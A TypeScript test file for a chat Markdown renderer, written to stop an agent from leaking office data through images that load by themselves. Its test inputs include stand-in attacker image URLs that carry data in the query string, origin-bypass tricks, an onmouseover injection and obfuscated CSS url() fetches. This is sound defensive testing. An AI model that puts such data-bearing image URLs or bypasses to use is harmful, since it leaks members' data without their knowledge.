// Images in chat Markdown (task 16f6b48c).
//
// An image that loads by itself is a way out with no click: an agent can put
// office data in its URL, and every member who opens the chat sends it. So
// only images from the office itself (its own origin, data: and blob:) load;
// an image from an outside site shows as a link to it. The office CSP
// (img-src, pinned in server/test-support/office-csp.test.ts) is the browser
// rule behind this; these cases pin what the renderer emits, so the reader
// gets a link instead of a broken image. The DOM origin is http://localhost/
// (ui/test-support/dom.ts).

import { describe, expect, it } from "bun:test";
import { setUpDomTestFile } from "../test-support/dom.ts";

setUpDomTestFile();

const { render } = await import("@testing-library/react");
const { Markdown } = await import("./Markdown.tsx");

function mount(content: string): HTMLElement {
  const view = render(<Markdown content={content} />);
  const root = view.container.querySelector<HTMLElement>(".md-content");
  if (!root) throw new Error("Markdown did not mount");
  return root;
}

// Every <img> whose source the browser would fetch from another origin.
function outsideImages(root: HTMLElement): string[] {
  const out: string[] = [];
  for (const img of root.querySelectorAll("img")) {
    const src = img.getAttribute("src");
    if (src === null) continue;
    let url: URL;
    try {
      url = new URL(src, location.href);
    } catch {
      continue;
    }
    if (url.protocol === "data:" || url.protocol === "blob:") continue;
    if (url.origin !== location.origin) out.push(src);
  }
  return out;
}

// The links in the message, as what the reader sees and where each goes.
function links(root: HTMLElement) {
  return Array.from(root.querySelectorAll("a"), (a) => ({
    text: a.textContent,
    href: a.getAttribute("href"),
  }));
}

describe("images from outside sites", () => {
  it("shows a Markdown image as a link that opens in a new tab", () => {
    const root = mount(
      "Done. ![status](https://attacker.example/p.png?d=member-data)",
    );
    expect(outsideImages(root)).toEqual([]);
    expect(root.querySelector("img")).toBeNull();
    const link = root.querySelector("a");
    expect([
      link?.textContent,
      link?.getAttribute("href"),
      link?.getAttribute("target"),
      link?.getAttribute("rel"),
    ]).toEqual([
      "status",
      "https://attacker.example/p.png?d=member-data",
      "_blank",
      "noopener noreferrer",
    ]);
    // The renderer marks the link as an image (the glyph's CSS hook).
    expect(link?.classList.contains("md-outside-image")).toBe(true);
  });

  it("shows a raw <img> as a link named by its alt text, or else its host", () => {
    const root = mount(
      `<img src="https://attacker.example/raw.png?d=1" alt="chart" width="20"> and <img src="https://cdn.example/x.png?d=2">`,
    );
    expect(outsideImages(root)).toEqual([]);
    expect(root.querySelector("img")).toBeNull();
    expect(links(root)).toEqual([
      { text: "chart", href: "https://attacker.example/raw.png?d=1" },
      { text: "cdn.example", href: "https://cdn.example/x.png?d=2" },
    ]);
    for (const a of root.querySelectorAll("a")) {
      expect(a.getAttribute("target")).toBe("_blank");
      expect(a.getAttribute("rel")).toBe("noopener noreferrer");
      expect(a.classList.contains("md-outside-image")).toBe(true);
    }
  });

  // Each source resolves to another origin once the browser reads it:
  // protocol-relative, a backslash the URL parser reads as a slash, a tab
  // the parser removes, another scheme, a look-alike host.
  it.each([
    ["protocol-relative", `<img src="//evil.example/a.png" alt="p">`],
    ["backslashes", `<img src="\\\\evil.example\\a.png" alt="p">`],
    ["a tab in the slashes", `<img src="/&#9;/evil.example/a.png" alt="p">`],
    [
      "a newline in the slashes",
      `<img src="/&#10;/evil.example/a.png" alt="p">`,
    ],
    ["the office host on https", `<img src="https://localhost/a.png" alt="p">`],
    [
      "a look-alike host",
      `<img src="http://localhost.evil.example/a.png" alt="p">`,
    ],
    ["a Markdown protocol-relative image", `![p](//evil.example/a.png)`],
  ])("treats %s as outside", (_label, content) => {
    const root = mount(content);
    expect(outsideImages(root)).toEqual([]);
    expect(root.querySelector("img")).toBeNull();
    expect(links(root).map((l) => l.text)).toEqual(["p"]);
  });

  it("shows alt text and URLs as text, never as markup", () => {
    const root = mount(
      `![<b>md</b>](https://h.example/a.png) <img src="https://h.example/b.png?q=&quot;onmouseover=alert(1)" alt="&lt;b&gt;raw&lt;/b&gt;">`,
    );
    expect(links(root)).toEqual([
      { text: "<b>md</b>", href: "https://h.example/a.png" },
      {
        text: "<b>raw</b>",
        href: 'https://h.example/b.png?q="onmouseover=alert(1)',
      },
    ]);
    expect(root.querySelector("a b")).toBeNull();
    for (const el of root.querySelectorAll("*"))
      for (const attr of Array.from(el.attributes))
        expect(attr.name.startsWith("on")).toBe(false);
  });
});

// Alt text is plain text: an extension that draws its own markup (math, a
// task chip) shows as its source, as the reader typed it.
it("shows math in alt text as its source", () => {
  const root = mount(
    "![sum $x^2$ here](https://h.example/a.png)\n\n![sum $x^2$ here](/api/files/a.png)",
  );
  expect(links(root).map((l) => l.text)).toEqual(["sum $x^2$ here"]);
  expect(root.querySelector("img")?.getAttribute("alt")).toBe("sum $x^2$ here");
});

describe("images from the office itself", () => {
  it("keeps loading same-origin, relative and data: images", () => {
    const pixel = "data:image/png;base64,iVBORw0KGgo=";
    const root = mount(
      [
        "![rel](/api/files/a.png)",
        "![abs](http://localhost/api/files/b.png)",
        `![inline](${pixel})`,
        `<img src="/api/files/c.png" alt="raw">`,
      ].join("\n\n"),
    );
    expect(
      Array.from(root.querySelectorAll("img"), (img) => [
        img.getAttribute("alt"),
        img.getAttribute("src"),
      ]),
    ).toEqual([
      ["rel", "/api/files/a.png"],
      ["abs", "http://localhost/api/files/b.png"],
      ["inline", pixel],
      ["raw", "/api/files/c.png"],
    ]);
    expect(root.querySelector("a")).toBeNull();
  });
});

// A badge inside a link (README badges) keeps one link, to the project: an
// <a> inside an <a> would make the browser close the outer one, and the
// badge would link to the image host instead.
describe("an outside image inside a link", () => {
  it.each([
    [
      "Markdown in Markdown",
      `[![build](https://shields.example/b.svg)](https://ci.example/)`,
    ],
    [
      "raw HTML in one block",
      `<p align="center"><a href="https://ci.example/"><img src="https://shields.example/b.svg" alt="build"></a></p>`,
    ],
    [
      "raw HTML inline, tag by tag",
      `see <a href="https://ci.example/"><img src="https://shields.example/b.svg" alt="build"></a> here`,
    ],
    [
      "a raw image in a Markdown link",
      `[<img src="https://shields.example/b.svg" alt="build">](https://ci.example/)`,
    ],
  ])("%s shows as the link's text", (_label, content) => {
    const root = mount(content);
    expect(outsideImages(root)).toEqual([]);
    expect(root.querySelector("img")).toBeNull();
    expect(links(root)).toEqual([
      { text: "build", href: "https://ci.example/" },
    ]);
  });

  it("is a link again once the outer link closes", () => {
    const root = mount(
      `<a href="https://ci.example/">ci</a> then [docs](https://docs.example/) then ![later](https://h.example/l.png)`,
    );
    expect(links(root)).toEqual([
      { text: "ci", href: "https://ci.example/" },
      { text: "docs", href: "https://docs.example/" },
      { text: "later", href: "https://h.example/l.png" },
    ]);
  });

  it("does not carry an unclosed link into the next message", () => {
    mount(`<a href="https://ci.example/">never closed`);
    const root = mount("![next](https://h.example/n.png)");
    expect(links(root)).toEqual([
      { text: "next", href: "https://h.example/n.png" },
    ]);
  });
});

describe("style values that fetch", () => {
  it("drops a style that loads an image and keeps a plain one", () => {
    const root = mount(
      [
        `<div title="s1" style="background-image:url(https://evil.example/c.png?d=1)">s1</div>`,
        `<div title="s2" style="background: IMAGE-SET('https://evil.example/c.png' 1x)">s2</div>`,
        `<div title="s3" style="background:u\\72l(https://evil.example/c.png)">s3</div>`,
        `<div title="s4" style="background:url&#40;https://evil.example/c.png)">s4</div>`,
        `<div title="s5" style="list-style-image: URL ( 'https://evil.example/c.png' )">s5</div>`,
        `<div title="ok" style="color: var(--text-primary); border: 1px solid var(--border)">ok</div>`,
      ].join("\n\n"),
    );
    expect(
      Array.from(root.querySelectorAll("div[title]"), (el) => [
        el.getAttribute("title"),
        el.getAttribute("style"),
      ]),
    ).toEqual([
      ["s1", null],
      ["s2", null],
      ["s3", null],
      ["s4", null],
      ["s5", null],
      ["ok", "color: var(--text-primary); border: 1px solid var(--border)"],
    ]);
  });
});
